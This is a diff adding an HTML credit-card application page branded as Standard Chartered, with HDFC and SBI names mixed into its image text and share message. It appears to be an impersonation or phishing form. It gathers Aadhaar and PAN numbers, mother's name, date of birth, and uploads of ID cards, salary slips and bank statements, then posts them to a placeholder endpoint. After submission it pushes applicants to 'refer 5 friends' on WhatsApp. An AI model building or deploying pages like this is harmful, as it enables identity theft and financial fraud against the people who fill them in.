@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Loan Application Form</title>
+  <style>
+    /* Global styles */
+    * {
+      box-sizing: border-box;
+      margin: 10px;
+      padding: 10px;
+    }
+
+    body {
+      background: #f2f8ff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: black;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    form {
+      background: #fff;
+      border-radius: 12px;
+      max-width: 900px;
+      width: 100%;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-top: 5px solid #3c70b7;
+      transition: all 0.3s ease;
+    }
+
+    .form-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .form-header img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+
+    .form-header h2 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #3c70b7;
+    }
+
+    .form-header p {
+      margin-top: 6px;
+      font-size: 16px;
+    }
+
+    .form-section {
+      margin-bottom: 25px;
+      border-radius: 8px;
+    }
+
+    .form-section > h3,
+    .form-section > h2 {
+      background: linear-gradient(to right, #3c70b7);
+      color: white;
+      padding: 10px 15px;
+      border-radius: 8px 8px 0 0;
+      font-size: 18px;
+      margin-bottom: 0;
+      text-align: center;
+      text-transform: uppercase;
+      user-select: none;
+    }
+
+    .form-group {
+      background: #f0f8ff;
+      padding: 20px;
+      border-radius: 0 0 8px 8px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(250px,1fr));
+      gap: 20px;
+    }
+      .address-container {
+      background-color: #f0f8ff;
+      padding: 20px;
+      width: 400px;
+    }
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: black;
+      font-size: 15px;
+      font-weight: bold;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="date"],
+    input[type="file"],
+    select,
+    textarea {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      background: #fafafa;
+      transition: border-color 0.3s ease;
+      resize: vertical;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus,
+    input[type="date"]:focus,
+    input[type="file"]:focus,
+    select:focus,
+    textarea:focus {
+      border-color: #0051d4;
+      outline: none;
+    }
+
+    textarea {
+      min-height: 60px;
+    }
+
+    button[type="submit"] {
+      margin-top: 20px;
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: 700;
+      background: linear-gradient(to right, #3c70b7);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      user-select: none;
+    }
+
+    button[type="submit"]:hover {
+      background: linear-gradient(to right, #0043af, #0073e6);
+    }
+
+    #responseMsg {
+      margin-top: 15px;
+      font-weight: 700;
+      text-align: center;
+      color: green;
+    }
+
+    /* Responsive stacking for small widths */
+    @media (max-width: 768px) {
+      .form-group {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Hidden sections */
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+  <form id="loanForm" enctype="multipart/form-data">
+    <div class="form-header">
+      <img src="image/Credit Cards/Standard Chartered Bank CC.png" alt="HDFC Simply SAVE UPI Credit Card Logo" />
+      <h2> Standard Chartered Bank Credit Card Application</h2>
+    </div>
+
+    <!-- Personal Information Section -->
+    <div class="form-section">
+      <h3>Personal Information</h3>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" required />
+
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" required />
+
+        <label for="phoneNumber">Phone Number</label>
+        <input type="tel" id="phoneNumber" name="phoneNumber" required />
+
+        <label for="dob">Date of Birth</label>
+        <input type="date" id="dob" name="dob" required />
+
+        <label for="motherNamePersonal">Mother's Name</label>
+        <input type="text" id="motherNamePersonal" name="motherNamePersonal" required />
+      </div>
+    </div>
+
+    <!-- KYC Details Section -->
+    <div class="form-section">
+      <h3>KYC Details</h3>
+      <div class="form-group">
+        <label for="aadhar">Aadhaar Number</label>
+        <input type="text" id="aadhar" name="aadhar" required />
+
+        <label for="pan">PAN Number</label>
+        <input type="text" id="pan" name="pan" required />
+
+        <label for="nameAsPerPan">Name as per PAN</label>
+        <input type="text" id="nameAsPerPan" name="nameAsPerPan" required />
+
+      
+  <h3>Permanent Address</h3>
+  <textarea id="permanentAddress" rows="4" placeholder="Enter permanent address here..."></textarea>
+
+  <br>
+ <div class="address-container">
+    <div class="checkbox-label">
+  <input type="checkbox" id="sameAddress" onclick="copyAddress()">
+  <label for="sameAddress">Same as Permanent Address</label></div></div>
+
+  <h3>Current Address</h3>
+  <textarea id="currentAddress" rows="4" placeholder="Enter current address here"></textarea>
+
+        <label for="pincode">Pincode</label>
+        <input type="text" id="pincode" name="pincode" required />
+      </div>
+
+    <!-- Employment Details Section -->
+    <div class="form-section">
+      <h3>Employment Details</h3>
+      <div class="form-group">
+        <label for="employmentType">Employment Type</label>
+        <select id="employmentType" name="employmentType" onchange="toggleEmploymentFields()" required>
+          <option value="">Select</option>
+          <option value="Salaried">Salaried</option>
+          <option value="Self-Employed">Self-Employed</option>
+        </select>
+
+        <label for="Business">Company/Business Name</label>
+        <input type="text" id="companyName" name="companyName" />
+
+        <label for="Business">Company/Business Address</label>
+        <textarea id="companyAddress" name="companyAddress"></textarea>
+
+        <label for="monthlyIncome">Monthly Income (Optional)</label>
+        <input type="text" id="monthlyIncome" name="monthlyIncome" placeholder="Optional"/>
+        
+        <label for="refer by">Refer By</label>
+        <input type="text" id="Refer By" name="Refer By" placeholder="optional"/>
+      
+      </div>
+    </div>
+
+    <!-- Salaried Additional Details -->
+    <div id="salariedFields" class="form-section hidden">
+      <h3>Additional Salaried Details</h3>
+      <div class="form-group">
+        <label for="officeAddress">Office Address</label>
+        <input type="text" id="officeAddress" name="officeAddress" />
+
+        <label for="officialEmail">Official Email ID</label>
+        <input type="email" id="officialEmail" name="officialEmail" placeholder="Optional" />
+
+        <label for="currentExp">Current Company Experience (Years/Months)</label>
+        <input type="text" id="currentExp" name="currentExp" />
+
+        <label for="totalExp">Total Work Experience (Years)</label>
+        <input type="text" id="totalExp" name="totalExp" />
+
+        <label for="reference1">Reference 1 (Name & Number)</label>
+        <input type="text" id="reference1" name="reference1" />
+
+        <label for="reference2">Reference 2 (Name & Number)</label>
+       <input type="text" id="referBy" name="referBy" placeholder="Optional" />
+
+        <label for="loanAmountSalaried">Loan Amount Required</label>
+        <input type="text" id="loanAmountSalaried" name="loanAmountSalaried" />
+
+        <label for="tenureSalaried">Tenure (Months/Years)</label>
+        <input type="text" id="tenureSalaried" name="tenureSalaried" /></div>
+
+          <div class="form-section">
+      <h3>Documents Required</h3>
+
+        <label for="panCardSalaried">PAN Card</label>
+        <input type="file" id="panCardSalaried" name="panCardSalaried" accept=".pdf,.jpg,.jpeg,.png" />
+
+        <label for="aadhaarCardSalaried">Aadhaar Card</label>
+        <input type="file" id="aadhaarCardSalaried" name="aadhaarCardSalaried" accept=".pdf,.jpg,.jpeg,.png" />
+
+        <label for="salarySlips">Last 3 Months' Salary Slips</label>
+        <input type="file" id="salarySlips" name="salarySlips" multiple accept=".pdf,.jpg,.jpeg,.png" />
+
+        <label for="bankStatement">Last 6 Months' Bank Statement</label>
+        <input type="file" id="bankStatement" name="bankStatement" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+    </div>
+
+    <!-- Self-Employed Additional Details -->
+    <div id="selfEmployedFields" class="form-section hidden">
+      <h3>Self-Employed Details</h3>
+      <div class="form-group">
+        <label for="selfCompanyName">Business Name</label>
+        <input type="text" id="selfBusinessName" name="selfBusinessName" />
+
+        <label for="selfCompanyAddress">Business Address</label>
+        <textarea id="selfBusinessAddress" name="selfBusinessAddress"></textarea>
+
+        <label for="selfReference1">Reference 1 (Name & Mobile Number)</label>
+        <input type="text" id="selfReference1" name="selfReference1" />
+
+        <label for="selfReference2">Reference 2 (Name & Mobile Number)</label>
+        <input type="text" id="selfReference2" name="selfReference2" placeholder="Optional"/>
+
+        <label for="loanAmountSelf">Loan Amount Required</label>
+        <input type="text" id="loanAmountSelf" name="loanAmountSelf" />
+
+        <label for="tenureSelf">Tenure (Months/Years)</label>
+        <input type="text" id="tenureSelf" name="tenureSelf" />
+        </div>
+       <div class="form-section">
+       <h3>Documents Required </h3>
+
+        <label for="aadhaarCardSelf">Aadhaar Card (front side)(Mandatory)</label>
+        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
+        <label for="aadhaarCardSelf">Pan Card(Mandatory)</label>
+        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
+<label for="aadhaarCardSelf">Aadhaar Card (backside)(Mandatory)</label>
+        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
+
+        <label for="businessProofType">Business Proof (Any One)</label>
+        <select id="businessProofType" name="businessProofType">
+          <option value="">Select</option>
+          <option value="GST">2 Years GST Registration Certificate</option>
+          <option value="ShopAct">Shop Act License</option>
+          <option value="TradeLicense">Trade License</option>
+          <option value="Msme">Msme</option>
+        </select>
+        <input type="file" id="businessProofFile" name="businessProofFile" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+    </div>
+
+  
+
+    <button type="submit">Submit Application</button>
+    <p id="responseMsg"></p>
+  </form>
+
+  <!-- Share Popup -->
+  <div id="sharePopup" style="display: none; text-align: center; margin: 20px auto; max-width: 900px;">
+    <h3>Success! Refer 5 Friends or Family to Fast Track Your Application</h3>
+    <p>Click below to share via WhatsApp:</p>
+    <a href="https://wa.me/?text=I%20just%20applied%20for%20the%20SBI%20Simply%20SAVE%20UPI%20Credit%20Card.%20Check%20it%20out!" target="_blank" rel="noopener noreferrer">
+      <button style="padding: 10px 20px; font-size: 16px; background-color: #25D366; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        Share on WhatsApp
+      </button>
+    </a>
+  </div>
+
+  <script>
+    function toggleLoantype() {
+      const employmentType = document.getElementById('LoanType').value;
+    }
+    function toggleEmploymentFields() {
+      const employmentType = document.getElementById('employmentType').value;
+      const salariedFields = document.getElementById('salariedFields');
+      const selfEmployedFields = document.getElementById('selfEmployedFields');
+
+      if (employmentType === 'Salaried') {
+        salariedFields.classList.remove('hidden');
+        selfEmployedFields.classList.add('hidden');
+      } else if (employmentType === 'Self-Employed') {
+        salariedFields.classList.add('hidden');
+        selfEmployedFields.classList.remove('hidden');
+      } else {
+        salariedFields.classList.add('hidden');
+        selfEmployedFields.classList.add('hidden');
+      }
+    }
+
+    const form = document.getElementById('loanForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      // Replace YOUR_WEB_APP_URL with the actual URL for submission
+      const res = await fetch('YOUR_WEB_APP_URL', {
+        method: 'POST',
+        body: formData,
+      });
+
+      const result = await res.json();
+      const responseMsg = document.getElementById('responseMsg');
+      responseMsg.innerText = result.success ? "✅ Submitted Successfully!" : "❌ Submission Failed!";
+      if(result.success) {
+        form.reset();
+        toggleEmploymentFields();
+        setTimeout(() => {
+          document.getElementById('sharePopup').style.display = 'block';
+        }, 1000);
+      }
+    });
+     function copyAddress() {
+      var permanentAddress = document.getElementById("permanentAddress").value;
+      var currentAddressField = document.getElementById("currentAddress");
+      var checkBox = document.getElementById("sameAddress");
+
+      if (checkBox.checked) {
+        currentAddressField.value = permanentAddress;
+        currentAddressField.readOnly = true;  // Optionally make it read-only
+      } else {
+        currentAddressField.value = "";
+        currentAddressField.readOnly = false;
+      }}
+  </script>
+  </body>
+</body>
+</html>
